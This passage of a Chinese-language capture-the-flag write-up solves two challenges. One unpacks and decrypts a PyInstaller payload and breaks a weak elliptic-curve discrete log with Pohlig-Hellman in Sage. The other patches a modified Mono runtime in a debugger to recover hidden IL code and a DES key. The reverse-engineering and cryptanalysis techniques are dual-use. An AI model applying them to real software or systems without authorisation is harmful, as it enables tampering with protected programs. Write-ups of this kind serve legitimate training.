        negative_self = Point(self.curve, self.x, -self.y, self.order)
        i = leftmost_bit(e3) ** 2
        result = self
        while i > 1:
            result = result.s1()
            if e3 & i != 0 and e & i == 0:
                result = result + self
            if e3 & i == 0 and e & i != 0:
                result = result + negative_self
            i = i // 2

        return result

    def __rmul__(self, other):
        return self * other

    def s1(self):   # double函数
        if self == g1:
            return g1
        p = self.curve.p # 曲线的p
        a = self.curve.a # 曲线的a
        l = (3 * self.x * self.x + a) * inv_mod(2 * self.y, p) % p   # 加法的lambda
        x3 = (l * l) - (2 * self.x) % p                            # 加法的x_3
        y3 = ((l * (self.x - x3)) - self.y) % p                    # 加法的y_3
        return Point(self.curve, x3, y3)


g1 = Point(None, None, None)   # g1是INFINITY

def f3(var0):
    var1 = 0
    for i in var0[::-1]:
        var1 = (var1 << 4) | int(i, 16)
    return var1
```

接下来只需要寻找 from var import * 中的var即可
根据pyinstxtractor.py的报错，发现magic number和python3.5差了1，于是将工具的检查去掉，用python3.5进行解包，可以得到var.pyc.encrypt

手动解密

```python
import zlib
import tinyaes

key = 'nu1lnu1lnu1lnu1l'

obj = open('var.pyc.encrypted', 'rb').read()
cipher = tinyaes.AES(key.encode(), obj[:16])
obj = cipher.CTR_xcrypt_buffer(obj[16:])

obj = zlib.decompress(obj)

open('var.pyc', 'wb').write(obj)
```

得到ECC的曲线和点

```
p = 0xfffffffffffffffffffffffffffffffeffffac73
a = 0xfffffffffffffffffffffffffffffffeffffac71
b = 0x21

Px = 0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e
Py = 0xafb7be2af28b649dab76337b42ee310119413529

Qx = 0x4945e0d8dc57e88d5949f84bf09943f572dbebb1
Qy = 0xb1bf040fe1939c7144341d3af61f36d63f47e272
```

sage实现Pohlig-Hellman进行求解

```python
p = 0xfffffffffffffffffffffffffffffffeffffac73
a = 0xfffffffffffffffffffffffffffffffeffffac71
b = 0x21

P = (0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e, 0xafb7be2af28b649dab76337b42ee310119413529)
Q = (0x4945e0d8dc57e88d5949f84bf09943f572dbebb1, 0xb1bf040fe1939c7144341d3af61f36d63f47e272)

F = FiniteField(p)
E = EllipticCurve(F, [a, b])
P = E.point(P)
Q = E.point(Q)

print(factor(P.order()))

primes = [2^6, 5, 17, 79, 4457, 40591, 585977563, 1460624777797, 5490618741917]

dlogs = []
for fac in primes:
    t = int(P.order()) // int(fac)
    dlog = discrete_log(t*Q,t*P, operation="+")
    dlogs += [dlog]
    print("factor: "+str(fac)+", Discrete Log: "+str(dlog))

crt(dlogs, primes)
```

得到的结果计算十六进制并反转就是最后的flag

## Misc

### MissingFunction

是unity游戏,mono虚拟机

这是个被重新编译后的mono,在jit编译的时候替换了encode函数

jit函数地址:mono.dll+1B4290,有混淆,不分析他

先断mono.dll+1B468D,在堆栈上获取method_header指针,调试器修改此处代码变成call mono_method_header_get_code,参数填入method_header,然后申请一块内存接收大小,得到原先的encode函数的ilcode

```
\x75\x09\x0B\x0B\x01\x01\x1D\x00\x33\x16\x0B\x0B\x0B\x0D\x08\x0C\x64\x08\x0B\x0B\x01\x14\x01\x53\x13\x52\xDA\x87\x08\x0B\x0B\x0A\x23\x0F\x0B\x0B\x01\x01\x0C\x1C\x53\x00\x0C\x08\x64\x0E\x0B\x0B\x01\x34\xDC\xF4\xF4\xF4\x0D\x1B\x0A\x79\x0A\x0B\x0B\x7B\x07\x79\x0A\x0B\x0B\x7B\x06\x23\x0D\x0B\x0B\x01\x03\x64\x0C\x0B\x0B\x01\x18\x0F\x23\x0D\x0B\x0B\x01\x02\x64\x0C\x0B\x0B\x01\x18\x0E\x78\x03\x0B\x0B\x01\x18\x0D\x78\x02\x0B\x0B\x01\x18\x0C\x1A\x0C\x1A\x0D\x1A\x0F\x1A\x0E\x64\x01\x0B\x0B\x01\x1C\x78\x00\x0B\x0B\x01\x18\x03\x1A\x03\x78\x07\x0B\x0B\x01\x18\x02\x1A\x02\x08\x64\x06\x0B\x0B\x01\x1A\x02\x64\x05\x0B\x0B\x01\x1A\x03\x64\x04\x0B\x0B\x01\x1A\x02\x64\x05\x0B\x0B\x01\x1A\x0C\x64\x1B\x0B\x0B\x01\x1D\x1A\x0C\x64\x1A\x0B\x0B\x01\x62\x23\x19\x0B\x0B\x01\x21
```

然后按一次按钮后, 断mono_runtime_invoke, call mono_method_header_get_code拿到替换后的ilcode

```
\x7E\x02\x00\x00\x0A\x0A\x16\x0B\x38\x1D\x00\x00\x00\x06\x03\x07\x6F\x03\x00\x00\x0A\x1F\x0A\x58\x18\x59\xD1\x8C\x03\x00\x00\x01\x28\x04\x00\x00\x0A\x0A\x07\x17\x58\x0B\x07\x03\x6F\x05\x00\x00\x0A\x3F\xD7\xFF\xFF\xFF\x06\x10\x01\x72\x01\x00\x00\x70\x0C\x72\x01\x00\x00\x70\x0D\x28\x06\x00\x00\x0A\x08\x6F\x07\x00\x00\x0A\x13\x04\x28\x06\x00\x00\x0A\x09\x6F\x07\x00\x00\x0A\x13\x05\x73\x08\x00\x00\x0A\x13\x06\x73\x09\x00\x00\x0A\x13\x07\x11\x07\x11\x06\x11\x04\x11\x05\x6F\x0A\x00\x00\x0A\x17\x73\x0B\x00\x00\x0A\x13\x08\x11\x08\x73\x0C\x00\x00\x0A\x13\x09\x11\x09\x03\x6F\x0D\x00\x00\x0A\x11\x09\x6F\x0E\x00\x00\x0A\x11\x08\x6F\x0F\x00\x00\x0A\x11\x09\x6F\x0E\x00\x00\x0A\x11\x07\x6F\x10\x00\x00\x0A\x16\x11\x07\x6F\x11\x00\x00\x0A\x69\x28\x12\x00\x00\x0A\x2A
```

文件里搜索替换一下就能拿到原先的encode逻辑

![](https://i.imgur.com/F7DTn0R.png)

Des key : mono.dll,iv : mono.dll

解出flag

![](https://i.imgur.com/YEech8n.png)
